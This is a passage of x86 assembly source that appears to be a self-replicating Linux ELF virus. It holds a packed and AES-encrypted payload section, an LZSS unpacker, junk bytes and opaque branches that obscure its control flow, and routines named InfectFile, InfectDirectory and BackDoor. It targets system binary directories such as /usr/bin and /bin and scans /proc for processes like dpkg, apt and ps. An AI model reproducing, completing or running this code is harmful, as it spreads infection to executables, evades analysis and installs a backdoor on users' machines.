    mov         r2d, DWORD [r5]
    jb          ..@SzpffR8EfWK2
    jae         ..@SzpffR8EfWK2
..@Razo7LskNDgU:
    cmp         QWORD [rsp+_LZSSD_OFF.length], 0x00
    jmp         $+5
db 0x3b, 0xdd, 0x81
    jmp         ..@mn5Md4ArCrfU
..@iqAKfVeBiwQJ:
%ifdef X86_32
    xor         ebp, ebp
    mov         eax, SYS_MMAP2
%endif
    jmp         ..@iaku14EpktMm
..@YzKYuWEJ7D7C:
    pop         rdi
    xor         rax, rax
    xor         rdx, rdx
    jmp         ..@WSqgJUAsRTOJ
..@2nI0DQlTXb0e:
    syscall
    jmp         $+3
db 0x63
    js          ..@Uj3Mghg5mXGW
    jns         ..@Uj3Mghg5mXGW
..@8P8tEFv9Spvd:
    xor         rdi, rdi
    jmp         $+5
db 0x38, 0xa8, 0x4c
    jmp         ..@fHRxnSmfsFcl
..@FusUEIRM6cxa:
    inc         DWORD [rsp+_LZSSD_OFF.index]
    jmp         $+4
db 0xa5, 0x0e
    jmp         ..@9NqS4xwx45Al
..@Pvl7sBQYk8Sl:
%ifdef X86_64
    xor         r9, r9
%endif
    jmp         $+3
db 0x0d
    je          ..@DhYxYuhen962
    jne         ..@DhYxYuhen962
..@N8ZTinQIUiJq:
    mov         rcx, 8
    call        ..@YzKYuWEJ7D7C
    jmp         $+4
db 0xd8, 0xef
    jmp         ..@JjV7b9owFMQx
..@fC49xQI5pOy1:
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    inc         DWORD [rsp+_LZSSD_OFF.index]
    js          ..@dtA4g6fJN6G8
    jns         ..@dtA4g6fJN6G8
..@tSTzsRaJWmO9:
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    mov         BYTE [rbx], al
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
    jmp         $+5
db 0x07, 0x5b, 0x82
    jmp         ..@8P8tEFv9Spvd
..@ddXNm06zffuB:
%ifdef X86_64
    syscall
%endif
    jmp         ..@XapKhwMwoJ6X
..@QLcro0BmanoO:
    jnz         ..@E8DluKIgYKxj
    js          ..@V5jDFx31Xm9Z
    jns         ..@V5jDFx31Xm9Z
..@agK3O6XS4MuD:
    test        rax, rax
    jz          ..@62ICeEklbbDf
    jmp         $+5
db 0x9a, 0xf8, 0x44
    jl          ..@N8ZTinQIUiJq
    jge         ..@N8ZTinQIUiJq
..@iZ19WNUqMjKF:
    mov         QWORD [rsp+_LZSSD_OFF.inputaddr], r1
    mov         QWORD [rsp+_LZSSD_OFF.outputaddr], r3
    mov         BYTE [rsp+_LZSSD_OFF.mask], 0x0
    jmp         $+3
db 0x45
    je          ..@M5y0M3s3drC7
    jne         ..@M5y0M3s3drC7
..@ZqmZtbfix3N1:
    jnz         ..@zcc4okHLhCFq
    jmp         $+3
db 0xdb
    jmp         ..@Rm58ekQreqN7
..@IR0yvIy5xSEF:
    mov         m8, rax
    jmp         ..@8IDwqacejqsw
..@9oDbWWSILi7U:
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    jb          ..@t89Dhdd0M88x
    jae         ..@t89Dhdd0M88x
..@x5fZtVUu8cEw:
    jmp         ..@d2Ly6b6dcs1q
    jmp         $+5
db 0x59, 0xf6, 0xad
    jl          ..@agK3O6XS4MuD
    jge         ..@agK3O6XS4MuD
..@7uTSH6lxwvHa:
%ifdef X86_32
    pop         ebp
%endif
    jmp         $+5
db 0x46, 0x02, 0x79
    jmp         $+4
db 0x3f, 0x01
    jmp         $+4
db 0xe4, 0x86
    je          ..@Pvl7sBQYk8Sl
    jne         ..@Pvl7sBQYk8Sl
..@9NqS4xwx45Al:
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    jmp         $+3
db 0x69
    je          ..@imj3ury8kqcw
    jne         ..@imj3ury8kqcw
..@Bj2JY06agdBy:
    mov         rdx, rax
    xor         rax, rax
    xor         rcx, rcx
    je          ..@LRm8HA8sqxyZ
    jne         ..@LRm8HA8sqxyZ
..@3zpU9BEOL0CP:
    rep         stosb
    jmp         $+3
db 0xbe
    jmp         ..@x5fZtVUu8cEw
..@sqYah8XnApyn:
    call        ..@YzKYuWEJ7D7C
    mov         rsi, rax 
    mov         rcx, LENGTH_BITS
    jmp         ..@3iWdJkGqprO0
..@R6rAmMj0RwvM:
    mov         rax, SYS_MUNMAP
    js          ..@2nI0DQlTXb0e
    jns         ..@2nI0DQlTXb0e
..@1e8LoySNVkmV:
    mov         rax, 0x20
    je          ..@3zpU9BEOL0CP
    jne         ..@3zpU9BEOL0CP
..@imj3ury8kqcw:
    jmp         ..@d2Ly6b6dcs1q
    jmp         $+3
db 0xe5
    jb          ..@62ICeEklbbDf
    jae         ..@62ICeEklbbDf
..@62ICeEklbbDf:
    mov         rcx, POSITION_BITS
    jl          ..@sqYah8XnApyn
    jge         ..@sqYah8XnApyn
..@eTBEVNSg6S0c:
    mov         rbx, rsi
    jmp         $+4
db 0x4c, 0x1c
    jmp         ..@xFuoBqLpJW1p
..@FCoq3zvGcoqw:
    lea         rdi, QWORD [rsp+_LZSSD_OFF.buffer] 
    jmp         ..@1e8LoySNVkmV
..@bd6BOvYuyH7C:
    inc         QWORD [rsp+_LZSSD_OFF.inputaddr]
    dec         QWORD [rsp+_LZSSD_OFF.length]
    mov         BYTE [rsp+_LZSSD_OFF.mask], 10000000b
    jmp         $+3
db 0xb7
    jmp         $+4
db 0x4f, 0xa9
    jb          ..@E8DluKIgYKxj
    jae         ..@E8DluKIgYKxj
..@WSqgJUAsRTOJ:
    xor         rbx, rbx
    jl          ..@zcc4okHLhCFq
    jge         ..@zcc4okHLhCFq
..@pghX1EYjNOfJ:
%ifdef X86_32
    mov         esi, 0x22
    mov         edi, 0xffffffff
    push        ebp
%endif
    jb          ..@iqAKfVeBiwQJ
    jae         ..@iqAKfVeBiwQJ
..@3pJffek8MamO:
    add         rsp, _LZSSD_OFF_size
    ret
..@iBqxwJDrepLM:
%ifdef X86_32
    mov         ecx, original_virus_len-non_packed_len
    mov         edx, 111b
%endif
    jmp         $+4
db 0x83, 0xb2
    jb          ..@pghX1EYjNOfJ
    jae         ..@pghX1EYjNOfJ
..@X0nPEO8taA2X:
    add         ecx, 1
    cmp         cl, dl
    jle         ..@eTBEVNSg6S0c
    jmp         ..@d2Ly6b6dcs1q

;-----------------------------------------------------
; PACKED & ENCRYPTED PART (This part of the code is 
; packed with LZSS then encrpyted and is executed in 
; a mapped zone).
_packed:
    jmp         Processes
;-----------------------------------------------------
; Packed & Encrypted structures.
struc _PROC_OFF
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x100
    .filefd     resd 0x1
endstruc
struc _NBF_OFF
    .index      resw 0x1
    .file       resq 0x1
    .key        resb 0x20
endstruc
struc _PAYLOAD_OFF
    .key        resb 0x20
    .index      resw 0x1
    .entry      resq 0x1
endstruc
struc _MUTA_OFF
    .start      resq 0x1
    .index      resd 0x1
    .size       resd 0x1
    .key        resq 0x1
    .random_BYTE resb 0x1
endstruc
struc _AESE_OFF
    .key_exp    resb 0x100
    .startaddr  resq 0x1
    .length     resq 0x1
    .keyaddr    resq 0x1
endstruc
struc _LZSSE_OFF
    .buffer     resb WINDOW_LENGTH*2
    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .saveoutptr resq 0x1
    .length     resq 0x1
    .buffersize resw 0x1
    .la_index   resw 0x1
    .w_index    resw 0x1
    .cmp_len    resb 0x1
    .match_pos  resw 0x1
    .match_len  resb 0x1
    .character  resb 0x1
    .bits       resb 0x1
    .mask       resb 0x1
endstruc
struc _UPDATASIG_OFF
    .signaddr   resq 0x1
    .index      resw 0x1
    .keyprev    resd 0x1
endstruc
struc _KEYGEN_OFF
    .bufferaddr resq 0x1
    .fd         resd 0x1
endstruc
struc _INFDIR_OFF
    .depth      resb 0x1
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x101*(SUBDIR_MAXDEPTH+1)
endstruc
struc _INFFILE_OFF
    .file       resb file_size
    .entry      resq 0x1
endstruc
struc _VADDR_OFF
    ._vaddr     resq 0x1
    .tmp_vaddr  resq 0x1
    .tmp_offset resq 0x1
endstruc
struc _DYNPIE_OFF
    .ptr        resq 0x1
    .sh_ptr     resq 0x1
    .shentsize  resw 0x1
    .shnum      resw 0x1
endstruc
;-----------------------------------------------------
; Packed & Encrypted variables.
VARIABLES packed
procdir:    db "/proc/", 0
status:     db "/status", 0

procs:
proc6:      db "dpkg", 0
proc5:      db "apt", 0
proc4:      db "ps", 0
proc3:      db "grep", 0
proc2:      db "cat", 0
proc1:      db "vim", 0
db 0x00

bash:       db "/bin/bash", 0
urandom:    db "/dev/urandom", 0
pwd_var:    db "PWD", 0

dirs_root:
bindir1:    db "/usr/local/sbin", 0
bindir2:    db "/usr/local/bin", 0
bindir3:    db "/usr/sbin", 0
bindir4:    db "/usr/bin", 0
bindir5:    db "/sbin", 0
bindir6:    db "/bin", 0
dirs_tmp:
test2:      db "/tmp/test2", 0
test:       db "/tmp/test", 0
db 0x00
;-----------------------------------------------------
; Packed & Encrypted code.
;-----------------------------------------------------
Processes:
    jmp         ..@QLmR5oGuva8g
..@n7lJuHT2JmdO:
    mov         eax, SYS_LSEEK
    syscall
    jmp         ..@PU7OZI7LBBcO
..@5roa49G0RwiD:
    add         r1, QWORD [r2]
    mov         QWORD [rsp+_DYNPIE_OFF.sh_ptr], r1
    xor         rbx, rbx
    jmp         $+4
db 0x24, 0xfa
    jl          ..@X9Tw0Go5RU9Z
    jge         ..@X9Tw0Go5RU9Z
..@0LfujBbczptF:
    mov         rax, QWORD [rsp+_LZSSE_OFF.outputaddr]
    sub         rax, QWORD [rsp+_LZSSE_OFF.saveoutptr]
    js          ..@LNTic7RaS6V9
    jns         ..@LNTic7RaS6V9
..@rD1we2dpyOkQ:
    mov         r1, rax
    jb          ..@yVnnG3d7Gf1u
    jae         ..@yVnnG3d7Gf1u
..@lBmU3HRVXdhQ:
    mov         r5, QWORD [r4+rax+p_h.p_vaddr]
    jmp         $+4
db 0x28, 0x4c
    je          ..@ejk1sQuiIJ9R
    jne         ..@ejk1sQuiIJ9R
..@sUZm4RULi9QI:
    mov         r2b, BYTE [rsp+_INFDIR_OFF.depth]
    add         r2, 1
    js          ..@WJ9Tf121a7yA
    jns         ..@WJ9Tf121a7yA
..@AeEvs6bYX0F6:
    push        rbp
    mov         rbp, rsp
    sub         rsp, _AESE_OFF_size+0x100
    jmp         ..@3LCH4rUoE8sA
..@6a3J6F7Co3aX:
    mov         r4, 0x1
    xor         rax, rax
    mov         eax, SYS_MREMAP
    js          ..@DmAGN0U6qbJf
    jns         ..@DmAGN0U6qbJf
..@YQJuimMl6fHB:
    add         rsp, _INFDIR_OFF_size
    ret
    jmp         $+4
db 0xae, 0x54
    je          InfectFile
    jne         InfectFile
..@25wd5MsTCPuu:
    mov         r4, r3
    jl          ..@1xkEGGtc5qLq
    jge         ..@1xkEGGtc5qLq
..@1xkEGGtc5qLq:
    sub         r4, QWORD [r1+e_h.e_entry]
    jmp         $+4
db 0x11, 0x37
    jl          ..@MwraE8bHBXsH
    jge         ..@MwraE8bHBXsH
..@9R0Iu4SuyiLg:
    test        eax, eax
    jnz         ..@2Avt8e2aBmMY
    jmp         $+3
db 0x40
    js          ..@HLw3PreJRC24
    jns         ..@HLw3PreJRC24
..@gCW16cbR8rLD:
    jl          ..@arQ5TSnb1bRI
    pop         rax
    mov         rax, rdi
    jmp         ..@RESVyoYdVpSi
..@qtRT9I7J7B2W:
    movzx       r3, WORD [r1+e_h.e_phentsize]
    mul         r3 
    jl          ..@lBmU3HRVXdhQ
    jge         ..@lBmU3HRVXdhQ
..@CCFQAICuD6Ri:
    OFILE       [r1], 0x10000
    cmp         eax, 0x03
    jl          ..@YQJuimMl6fHB
    jmp         $+4
db 0x9a, 0x67
    je          ..@rtJ8tXg4jvUr
    jne         ..@rtJ8tXg4jvUr
..@5TnHrktPP2O6:
    jmp         ..@7KHSEpiFze86
    jmp         ..@73Ytbkw6lXmF
..@cYeLdk29q3ei:
    xor         r4, r4
    mov         r5, [rsp+_NBF_OFF.file]
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+3
db 0xe3
    jl          ..@HlhUgkYDgwc2
    jge         ..@HlhUgkYDgwc2
..@lAi8oTVbSfnV:
    inc         WORD m5
    jmp         ..@wQDsr1hFEvJo
    jb          ..@yuZfsxnj9hDG
    jae         ..@yuZfsxnj9hDG
BackDoor:
    jmp         ..@APWZiPjU8HmQ
..@i4JnkiPpN4zA:
    mov         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    mov         WORD [rsp+_LZSSE_OFF.w_index], 0x0000
    jmp         $+5
db 0x81, 0x3d, 0xb0
    jmp         ..@qBdYgtZxu8W4
..@Iki56i5KPpsB:
    mov         dx, WORD [rsp+_LZSSE_OFF.la_index]
    je          ..@XBXDjTWRQIbK
    jne         ..@XBXDjTWRQIbK
..@8dXIGrYbOegR:
    mov         BYTE [rsp+_LZSSE_OFF.cmp_len], dl
    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x0
    jmp         $+4
db 0x83, 0xa1
    jmp         $+4
db 0xef, 0xea
    jmp         ..@LHkz9cbFG4lG
..@x42NiqsgiRKa:
    call        UnmapFile
    jmp         $+4
db 0x34, 0x8f
    jmp         $+4
db 0xc1, 0x4e
    je          ..@N7HWmUkCqryW
    jne         ..@N7HWmUkCqryW
..@c82ys0RFFszU:
    je          ..@dN3Qf2HAIQLh
    jmp         $+3
db 0xfe
    jmp         $+3
db 0x23
    jl          ..@cd1J4EEKhCz8
    jge         ..@cd1J4EEKhCz8
..@0MGfSq8YL8ka:
    ret
    jl          InfectDirectory
    jge         InfectDirectory
..@gx7sAO19hIAC:
    call        InfectFile
    js          ..@E30ij6Jqzn3b
    jns         ..@E30ij6Jqzn3b
..@Br6lPc9HirVz:
    mov         rax, r2
    jmp         $+4
db 0xe0, 0xd0
    jl          ..@qtRT9I7J7B2W
    jge         ..@qtRT9I7J7B2W
..@HKOuqBlc5gRe:
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], rsi
    jmp         $+3
db 0x2a
    jmp         $+3
db 0xbc
    jmp         ..@7hgAnoEViXG2
..@ZYhgE4GAJILI:
    movdqu      xmm1, oWORD [rsp+0x80]
    jmp         $+4
db 0x24, 0x85
    jb          ..@T2aqKQ34s5mg
    jae         ..@T2aqKQ34s5mg
..@PEySLU2VW27t:
    jne         ..@OUigEOCdc93v
    xor         rax, rax
    jmp         ..@pRczSHbQswgV
..@lAVV4vVXH0EA:
%ifndef ENABLE_DEBUGGING
    jz          ..@FLOpcNILXmqb
%endif
    jmp         $+3
db 0xdb
    jmp         ..@N3nkgLLSdJoB
..@MAd8nxN6g5Bk:
    mov         cl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    add         ecx, 1
    jmp         $+5
db 0x78, 0x8c, 0x85
    jl          ..@mH4B4vKb6rmn
    jge         ..@mH4B4vKb6rmn
..@mfBf4EUFNzAr:
%ifndef ENABLE_DEBUGGING
    syscall
    sub         r2, 1
%endif
    jmp         $+4
db 0x0c, 0xb6
    jmp         $+4
db 0x8d, 0x36
    jb          ..@6v9kkk8rBFKy
    jae         ..@6v9kkk8rBFKy
..@h6YPD507PBBQ:
%ifdef X86_32
    mov         esi, r2
%endif
    je          ..@bRwFjBudkp2z
    jne         ..@bRwFjBudkp2z
..@ruHQhX3gBaSr:
    VAR         packed, procs
    jmp         $+3
db 0xb2
    jmp         $+3
db 0xff
    jmp         $+3
db 0x87
    js          ..@xuzWxD4br9uq
    jns         ..@xuzWxD4br9uq
..@7HTBwlND5X3C:
    sub         rsp, _INFFILE_OFF_size
    je          ..@m7rwl0eyeD48
    jne         ..@m7rwl0eyeD48
..@lPK4RQ6Btbri:
    add         r1, 1
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    call        Strcpy
    jmp         $+4
db 0x64, 0xb3
    js          ..@HHh6cNtryLtb
    jns         ..@HHh6cNtryLtb
..@BIi4Qc1lzBTK:
%ifndef ENABLE_DEBUGGING
    xor         r1, r1
%endif
    jmp         $+3
db 0x86
    jmp         $+4
db 0xfa, 0xff
    jl          ..@b9sZ5B0HUiLs
    jge         ..@b9sZ5B0HUiLs
..@bl0DTHrUGk6X:
    aesenc      xmm0, xmm1
    jb          ..@LGcapTZpzOOj
    jae         ..@LGcapTZpzOOj
..@mOBWMYPcJdgQ:
    sub         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH
    jmp         $+4
db 0xf8, 0x14
    jl          ..@f57cR6b8gqUv
    jge         ..@f57cR6b8gqUv
..@8t1BEkvS7gq0:
%ifndef ENABLE_DEBUGGING
    xor         r3, r3
%endif
    jmp         $+4
db 0x6b, 0xeb
    jmp         $+4
db 0xd7, 0x33
    jl          ..@5wSesUGzV9ZE
    jge         ..@5wSesUGzV9ZE
..@x6qdAoZH1Acq:
    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], 0
    mov         QWORD [rsp+_VADDR_OFF._vaddr], 0
    xor         rax, rax
    jmp         $+5
db 0xfd, 0x10, 0x35
    jl          ..@1w5M1vyScZYP
    jge         ..@1w5M1vyScZYP
..@UMHMH36GFnB9:
    test        rax, rax
    jz          ..@K8xXv8fftyl8
    jmp         ..@mkJ5HWodLpON
..@kVOWXw2ijCw4:
    mov         rax, (-1)
    jmp         ..@tLKzoiDXBZ3g
..@vnao0ucwtzOj:
%ifdef X86_64
    mov         r8, 0xffffffffffffffff
%endif
    jmp         ..@mxx6jmksVMAk
..@TSQ45EMtl3rh:
    OFILE       [rsp+_PROC_OFF.buffer], 0x00
    jmp         ..@gJXrn9OEZpIf
..@91Ld5crl16Aj:
    xor         r3, r3
    jb          ..@ot5HFjHnlgpb
    jae         ..@ot5HFjHnlgpb
..@m1LhfoYx7z6X:
    add         eax, 0x57
    js          ..@I9CJGnk2o3kR
    jns         ..@I9CJGnk2o3kR
..@n89nT4TbLvmF:
    call        MapFile
    jmp         $+4
db 0x8d, 0x41
    jmp         $+3
db 0x3b
    jmp         $+4
db 0x71, 0x49
    jmp         $+4
db 0x8e, 0x27
    jl          ..@g7QjfTtRbkNK
    jge         ..@g7QjfTtRbkNK
..@zRY1nY8LyCph:
    jmp         ..@B0BADypkjmYD
    jmp         $+4
db 0x35, 0x26
    jmp         ..@ZlzoWbGZ1rCK
..@J7SehvysXAlN:
    mov         QWORD [rsp+_AESE_OFF.startaddr], r1
    mov         QWORD [rsp+_AESE_OFF.length], r2
    mov         QWORD [rsp+_AESE_OFF.keyaddr], r3
    jmp         $+4
db 0x00, 0xa9
    jl          ..@GNunL9rMS4eW
    jge         ..@GNunL9rMS4eW
..@HjiHpkptb2SH:
    cmp         rax, 0x00
    jle         ..@wQDsr1hFEvJo
    je          ..@NrWRic3pEIYf
    jne         ..@NrWRic3pEIYf
..@rWoWrYwRy25g:
    call        MemMove
    jmp         ..@Yha9FWl7CADZ
..@srBeW1FJ8yc1:
    mov         QWORD [r5+file.filesize], rax
    jmp         ..@G33XnevC63bf
..@WpPtAueU5ari:
    mov         [rsp+_LZSSE_OFF.inputaddr], rsi
    jmp         $+3
db 0xac
    jmp         ..@nrAsoxSX0FYK
..@G2vj5Dap1mbM:
    xor         rax, rax
    jmp         $+5
db 0x75, 0xd8, 0x15
    jmp         ..@XE5io7M49GmC
..@BcA3RGckqAXi:
    jmp         ..@m1LhfoYx7z6X
    jmp         ..@WG8iNeOwxfVr
..@c1x7Xd47A6Qn:
    cmp         BYTE [r1], 0x39
    jmp         $+3
db 0x9f
    js          ..@saROOB9fADkw
    jns         ..@saROOB9fADkw
..@JXdXZohRUk08:
    mov         ecx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    jmp         ..@qpYTNr9TdNkd
..@AAswunVkE3DA:
    xor         rax, rax
    jl          ..@6oEJ0ti81Y2t
    jge         ..@6oEJ0ti81Y2t
..@TXmcbNhC9hPa:
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x60]
    jmp         ..@wG4CzBhIPJsE
..@MDLqjhkzeZky:
%ifndef ENABLE_DEBUGGING
    jl          ..@BIi4Qc1lzBTK
%endif
    jmp         ..@QDXiNVBY30y3
..@NjDtL4vj3iyA:
%ifdef X86_64
    xor         r9, r9
    mov         rsi, QWORD [r8+file.filesize]
%endif
    jmp         $+5
db 0xf0, 0x0b, 0x8f
    jb          ..@lo13QlXN1YNn
    jae         ..@lo13QlXN1YNn
..@joh060IY3qON:
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0xa0]
    aesenc      xmm0, xmm1
    je          ..@GRP8WCm0NhRk
    jne         ..@GRP8WCm0NhRk
..@3aalKWK5995i:
    ret
    jmp         FileValidation
..@XNYcDJJOcc52:
    push        r1
    mov         r5, r2
    jmp         $+3
db 0xaf
    jmp         $+3
db 0x04
    jmp         $+4
db 0xa2, 0xe6
    jl          ..@F6AUdMJLgoZ6
    jge         ..@F6AUdMJLgoZ6
..@i2Hz5QwHcDCV:
%ifndef ENABLE_DEBUGGING
    xor         r3, r3
%endif
    jl          ..@18WcfIg6mNzQ
    jge         ..@18WcfIg6mNzQ
..@aol0vEACItR9:
    push        r5
    jmp         $+3
db 0x2d
    jmp         ..@WuTRGghTLcCh
..@x9uawLgKnusM:
    ret
    jmp         $+4
db 0xf2, 0x24
    js          ..@X9ljtYImVWpb
    jns         ..@X9ljtYImVWpb
..@uLD53QGWgJFh:
%ifdef X86_64
    mov         rcx, rdx
%endif
    js          ..@wavOFKXd2hLq
    jns         ..@wavOFKXd2hLq
..@YryzbIH1oL56:
    mov         r3, _signature.startsize
    js          ..@VnSNSWnHab3F
    jns         ..@VnSNSWnHab3F
..@rlk3AcwBaeNo:
    push        r1
    push        r2
    jl          ..@uEO04jqRgfzu
    jge         ..@uEO04jqRgfzu
..@gLuOpw7YkXlC:
    jne         ..@5ejll91GRBj6
    jmp         $+5
db 0x4c, 0x25, 0x3d
    jmp         $+3
db 0x0d
    jmp         $+4
db 0x23, 0xe1
    jmp         ..@PqONVt1SwScP
..@wQDsr1hFEvJo:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         $+3
db 0xa0
    jmp         $+4
db 0x16, 0xf1
    jl          ..@8Ke8BMb5kmyZ
    jge         ..@8Ke8BMb5kmyZ
..@SFe9fzb3gou1:
%ifdef X86_64
    mov         eax, SYS_MMAP
%endif
    jmp         $+3
db 0xaa
    js          ..@snltTh2FT3Ir
    jns         ..@snltTh2FT3Ir
..@6mbUmxOlWdt1:
%ifdef X86_32
    xor         ebp, ebp
    mov         eax, SYS_MMAP2
    int         0x80
%endif
    jmp         $+3
db 0x8b
    jl          ..@QznE75qsHekW
    jge         ..@QznE75qsHekW
..@HmjyFAK4TDXW:
    jnz         ..@GTf59OKL9Dpc
    jl          ..@OZfcLqTmISNu
    jge         ..@OZfcLqTmISNu
..@LhD1yg5AItNH:
    sub         rsp, _PAYLOAD_OFF_size
    mov         QWORD [rsp+_PAYLOAD_OFF.entry], r1
    mov         WORD [rsp+_PAYLOAD_OFF.index], r2w
    jmp         ..@XdczHvl9VDcs
..@dGCzHKkjlUzY:
    sub         rdi, 1
    sub         rsi, 1
    std
    jmp         ..@SmlYlAcuikjz
..@JaapuLiSC9Xg:
    cmp         al, 0xa
    jmp         ..@ZJHaugqdp65y
..@clCscZAAAk7Q:
%ifdef X86_32
    mov         esi, 0x22
%endif
    jl          ..@gqZ94AzM67KQ
    jge         ..@gqZ94AzM67KQ
..@snltTh2FT3Ir:
%ifdef X86_64
    syscall
%endif
    jb          ..@mpEoNbZooDxU
    jae         ..@mpEoNbZooDxU
..@bxEafB5VTwKQ:
    xor         rdx, rdx
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    jl          ..@FgjYmiKNfYwJ
    jge         ..@FgjYmiKNfYwJ
..@cPoISx0EE5NG:
    xor         rdx, rdx
    mov         dl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    sub         dl, cl
    jl          ..@uaKrFMbpjP5B
    jge         ..@uaKrFMbpjP5B
..@Ugs81djG3TT2:
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    jmp         ..@EaLTHAJpfYor
..@cpxWHfYQ37Vb:
    mul         r2
    add         rax, r1
    jmp         $+5
db 0x97, 0x4f, 0x7c
    jmp         $+4
db 0xe5, 0x28
    jmp         $+3
db 0x7e
    jl          ..@C42cOnMjC0gb
    jge         ..@C42cOnMjC0gb
..@pItrwSPfhngM:
    mov         al, BYTE [rsp+_LZSSE_OFF.buffer+rbx]
    jmp         $+3
db 0x50
    jb          ..@070bFtgjJ81m
    jae         ..@070bFtgjJ81m
..@fuRJBf43PV1x:
    add         rsp, _PAYLOAD_OFF_size
    jmp         $+3
db 0x33
    jb          ..@PjeX1oqfiGwt
    jae         ..@PjeX1oqfiGwt
..@QUEYYeJRCkpa:
    xor         rax, rax
    jmp         $+4
db 0xfd, 0xf6
    jb          ..@x9uawLgKnusM
    jae         ..@x9uawLgKnusM
..@XE5io7M49GmC:
    CFILE       DWORD [r5+file.filefd]
    jmp         $+4
db 0xa2, 0xd7
    jb          ..@RK2S7dpTmzdB
    jae         ..@RK2S7dpTmzdB
..@qBdYgtZxu8W4:
    xor         rax, rax
    js          ..@GyIb0FlrQPN7
    jns         ..@GyIb0FlrQPN7
..@LHkz9cbFG4lG:
    mov         BYTE [rsp+_LZSSE_OFF.match_pos], 0x1
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    xor         rax, rax
    jmp         $+5
db 0x78, 0xd6, 0x7d
    jmp         $+5
db 0x14, 0x69, 0x8c
    js          ..@uMXfxxT6Y1Mn
    jns         ..@uMXfxxT6Y1Mn
..@Vbkhs6iNAf0p:
    jne         ..@uS0EiiY7Y1dx
    js          ..@a5Iwvk3QMFiK
    jns         ..@a5Iwvk3QMFiK
..@uaKrFMbpjP5B:
    cmp         dl, BYTE [rsp+_LZSSE_OFF.match_len]
    jmp         ..@M5OZAlp8RhEx
..@3BHLba09CYYz:
    and         r2, 1b
    jmp         $+4
db 0x50, 0x7a
    jmp         $+3
db 0xe7
    jmp         ..@Y4zeeDQ8hToa
..@OQhs4eL3MzGv:
    mov         r1, QWORD [r5+file.fileptr]
    cmp         DWORD [r1], 0x464c457f
    jmp         ..@OzuHjy46OlyS
..@cKm36vz1puIO:
    aesenclast  xmm0, xmm1
    movdqu      [rsi+rcx], xmm0
    add         rcx, 0x10
    jmp         $+5
db 0xeb, 0x8d, 0x37
    jmp         $+5
db 0x34, 0xd9, 0x3e
    jl          ..@FKPyyBeoD0fE
    jge         ..@FKPyyBeoD0fE
..@RiwfKybu7dsz:
    je          ..@WF9BP9IqrEW9
    jmp         $+4
db 0xe4, 0x4c
    je          ..@bHEpACJkpI1r
    jne         ..@bHEpACJkpI1r
..@nIj2jYHQKcg2:
    call        WORDToDWORDASCII
    jmp         $+3
db 0x91
    jmp         $+3
db 0x45
    jmp         ..@h2ndWB2zzdCt
..@VMVhtNrfOeXd:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_FORK
%endif
    jmp         $+4
db 0xf9, 0x38
    jmp         ..@oI0LawZFaH0V
..@XdczHvl9VDcs:
%ifdef X86_32
    xor         eax, eax
    mov         ecx, original_virus_len+PADDING
%endif
    jmp         $+4
db 0x47, 0x8c
    jmp         ..@Iw70MRih8wg4
..@DemRlB7BiDZD:
    ODIR        [rsp+_INFDIR_OFF.dirfd], [rsp+_INFDIR_OFF.dirbuf], DIRENT_BUFSIZE
    jmp         $+4
db 0x83, 0x19
    jmp         $+5
db 0x6a, 0xa7, 0x2a
    jmp         $+3
db 0x01
    jmp         ..@qq1XlTPw79Lq
..@uzvn5kwGomio:
    ret
    jmp         $+4
db 0x4b, 0x5c
..@NPVLgMXBV4JG:
    mov         DWORD [r5+file.filefd], eax
    jmp         $+4
db 0xc0, 0x36
    jl          ..@hRFPjjkMTOg2
    jge         ..@hRFPjjkMTOg2
..@VBvRNmxwLeaX:
    movdqu      xmm1, oWORD [rsp+0x90]
    jl          ..@joh060IY3qON
    jge         ..@joh060IY3qON
..@qvOFX4grJPqR:
    add         rdi, rax
    xor         rax, rax
    xor         rbx, rbx
    js          ..@1PgHTRYNl33i
    jns         ..@1PgHTRYNl33i
..@R0luifdXCQye:
    mov         r1, r5
    call_vsp    Strlen
    add         r5, rax
    jmp         ..@X3dfWbgxaRqG
..@MwraE8bHBXsH:
    cmp         r4, 0x00
    jle         ..@wQDsr1hFEvJo
    js          ..@rlk3AcwBaeNo
    jns         ..@rlk3AcwBaeNo
IsELFComplete:
    jmp         ..@vLnJJ1gxc2L1
..@P76tyT1JznGc:
    call        MemMove
    jmp         $+4
db 0x4f, 0x31
    jmp         ..@7ys4satLwRj4
..@Gw2B3XDlAdKI:
    xor         rdx, rdx
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    jmp         $+3
db 0xff
    jmp         ..@MZ875haJfsue
..@ngtmI1qYAT02:
    push        r1
    je          ..@R0luifdXCQye
    jne         ..@R0luifdXCQye
..@X8tMDOScBVdZ:
    call        Strcpy
    mov         BYTE [r1], 0x00
    jmp         ..@TSQ45EMtl3rh
..@ud4cXyzbPkIS:
    xor         r4, r4
    jmp         $+4
db 0x8f, 0xb0
    js          ..@Z4XCWgGkB3Tv
    jns         ..@Z4XCWgGkB3Tv
